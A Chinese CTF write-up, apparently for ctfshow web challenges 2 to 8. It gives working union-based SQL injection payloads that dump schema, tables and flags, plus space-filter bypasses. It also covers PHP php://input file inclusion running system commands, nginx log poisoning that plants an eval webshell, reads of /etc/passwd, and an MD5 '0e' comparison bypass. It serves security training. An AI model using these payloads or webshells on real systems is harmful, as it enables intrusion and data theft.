#### web 2

常规的SQL注入 首先是一个登录框，一般遇到这种情况呢可以先抓包看看 随便输入账号密码 例如 账号admin 密码123456 抓包后，由于是post提交 可以在账号密码中拼接SQL语句 

**SQL注入思路**

 1.根据参数username和password推断为数据库查询，推测查询语句为 select  from user where username=? and password=?，所以用户名处填写 ' or 1=1;#（#为注释，用于截断后续条件），验证通过，因此接下来查询数据库的信息，首先判断中间有几列，因为使用 UNION 的时候两个表的列数量必须相同，因此测试直到填写 ' or 1=1 union select 1,2,3;#判断处有三列，根据返回的信息“欢迎你，ctfshow欢迎你，2”判断前端显示的是第2列内容。 

**ps：**可以使用 `ORDER BY` 子句来尝试。例如，从 1 开始逐渐增加数字，如 `ORDER BY 1` 、 `ORDER BY 2` 等，直到出现错误。当出现错误时，说明之前成功的那个数字就是表中的最大列数。

2.首先查询数据库名字 ，输入语句 ' or 1=1 union select 1,database(),3;# 得到返回信息为“欢迎你，ctfshow欢迎你，web2，所以数据库名为web2。 

3.然后根据语句  ' or 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="web2"),3;#。**group_concat 是为了将查询结果连接成一个字符串输出**，结果为“欢迎你，ctfshow欢迎你，flag,user”，因此我们得知有两个表为flag和user。 

4.接下来就是获取flag表格的列名，输入语句 ' or 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_name= 'flag' and table_schema='web2" ),3 #。根据结果“欢迎你，ctfshow欢迎你，flag”得出列名为flag 

5.最后获取flag，输入语句' or 1=1 union select 1,(select flag from flag limit 0,1 ),3 # （limit目的为获取第一行的值）获得结果“欢迎你，ctfshow欢迎你，ctfshow{b2faa05a-c4cc-4a5f-a58f-9391ebb19afa}”

**SQL注入查询顺序**：列数——库名（schema_name）——表名(table_name)——字段名(column_name)

- 库名

```
SELECT * FROM users WHERE username='-1' or '1'='1' union SELECT 1,schema_name,2 FROM information_schema.schemata;-- ' AND password='$password';
```

- 表名

```
SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(table_name),2 from information_schema.tables where table_schema=database()-- ' AND password='$password';
```

- 字段名

```
SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- ' AND password='$password';
```



#### web3

进入题目链接，观察到页面展示了部分源码，为PHP语言，查询得知其中include函数涉及**文件包含漏洞**。

确认该题为PHP文件包含漏洞后，通过了解可使用代理抓包软件Burpsuit去抓包,并且使用**PHP伪协议**中的`php://input`来在包的最下面写上`<?php system('ls')?>`执行系统命令查看当前目录的文件，来查看有无目标文件。

打开bp代理，对该网页进行拦截抓包，在GET请求的url中拼接伪协议`php://input`,将该数据包内容后加入`<?php system('ls')?>`（前面要有一行空行），然后进行放包操作。

观察到放包后页面出现`ctf_go_go_go index.php`字段，ctf_go_go_go文件应该就是藏匿flag的文件。

接着直接在url地址栏中输入url参数,访问ctf_go_go_go文件,得到flag。



#### web4

尝试像**web3**那样使用php伪协议，回显error

看了看提示：日志注入 文件包含

使用Wappalyzer查看一下，使用的中间件是Ngnix[^nginx]

尝试读取它的日志文件：

`?url=/var/log/nginx/access.log`

`?url=/var/log/nginx/error.log`

尝试读取Linux系统下的用户信息：

`?url=/etc/passwd`

从上面的日志信息可以看出是User-Agent的内容，在User-Agent里插入一句话木马

`<?php @eval($_POST['CMD']);?> `

由于访问URL时，服务器会对其进行编码，所以通过使用burpsuite抓包来进行来注入

写入一句话木马之后，使用蚁剑尝试连接，连接url即为日志的地址。

进入后台，找到flag



#### web5

题目为php代码分析，查看代码，关键部分为：

```
<?php
    $flag = ""; // 初始化一个空字符串变量 $flag
    $v1 = $_GET['v1']; // 从 GET 请求中获取参数 'v1' 的值，并赋值给 $v1
    $v2 = $_GET['v2']; // 从 GET 请求中获取参数 'v2' 的值，并赋值给 $v2

    if(isset($v1) && isset($v2)){ // 检查 $v1 和 $v2 是否都已设置（存在且不为 NULL）
        if(!ctype_alpha($v1)){ // 如果 $v1 不只是字母，输出 "v1 error" 并终止脚本
            die("v1 error");
        }
        if(!is_numeric($v2)){ // 如果 $v2 不是数字，输出 "v2 error" 并终止脚本
            die("v2 error");
        }
        if(md5($v1) == md5($v2)){ // 如果 $v1 和 $v2 的 MD5 哈希值相等，输出 $flag 的值
            echo $flag;
        }
    }else{ // 如果 $v1 或 $v2 没有设置
        echo "where is flag?"; // 输出 "where is flag?"
    }
?>
```

要求v1与v2的md5哈希值相等，这里可以使用MD5的0e绕过方式，输入`?v1=QNKCDZO&v2=240610708`

```
QNKCDZO 的md5值为 0e830400451993494058024219903391
240610708 的md5值为 0e462097431906509019562988736854
```

分别满足纯字母和数字字符串,并且md5值以0e开头,而**0e开头的字符串参与比较(==)时,会转化为0**,也就是 0\==0,返回true使if判断成立,从而输出flag。

附：[常见的0E开头的MD5](常见的0E开头的MD5.md)



#### web6

如web2做法发现回显`sql inject error`

使用bp抓包发现username处显示`%27+or+1%3D1%23`（空格没了）可知为空格检测

空格被注释掉了，所以想办法把空格给替代掉，这里注释的方法有两种，那就是注释符/* */和%a0

输入`'/**/or/**/1=1#`，发现可以登录

于是按web2的方法做，只需在空格处加入注释即可。



#### web7

从url地址栏中可以看到,页面通过文章的id值来查询文章内容,可以考虑SQL注入漏洞

`id=1`后输入`1=1`回显`sql inject error`源码中过滤了空格,可以使用括号()或者注释/**/来代替空格

故输入`1/**/and/**/1`,使SQL恒成立,可以看到,页面正常显示

输入`1/**/and/**/0`，使SQL恒不成立，可以看到,页面空显示

由此可以判断页面存在SQL注入,注入点为**数值型注入**,页面中有显示位,可以尝试**联合注入**进行脱库

先来判断显示位,往id传一个-1,判断字段显示的位置

```
-1/**/union/**/select/**/1,2,3
```

接下来按web2与web6的方法做即可



#### web8

本8关是一个SQL 注入漏洞, 注入点是数值型, 注入类型推荐使用布尔盲注,此关卡过滤了空格,逗号,and,union等关键字, 

1. 过滤空格, 可以使用括号() 或者注释/**/ 绕过
2. 过滤and, 可以使用or替代
3. 过滤union, 可以用盲注替代联合注入
4. 过滤逗号, 可以使用特殊语法绕过, 比如:substr(database(),1,1) 可以用substr(database() from 1 for 1)来代替



























[^robots协议]:robots协议是一个位于网站根目录下的robots.txt文件，用来指示搜索引擎爬虫哪些页面可以访问，哪些页面禁止访问。通过遵守Robots协议，可以有效地控制搜索引擎爬虫的抓取行为，维护网站的合法权益。
[^xff]: “XFF” 通常指的是 “X-Forwarded-For”，这是一个 HTTP 请求头字段。它用于识别通过 HTTP 代理或负载均衡器连接到 Web 服务器的客户端的原始 IP 地址。当客户端请求经过多个代理服务器时，每个代理服务器都会把客户端的真实 IP 地址添加到 “X-Forwarded-For” 请求头中，用逗号分隔。

[^referer]: “Referer”是 HTTP 请求头的一个字段,它用于告知服务器，当前请求页面的来源页面的 URL 地址。

[^nginx]: Nginx 作为是高性能的 Web 服务器和反向代理服务器，在系统架构中起到了重要的中间连接和协调作用。
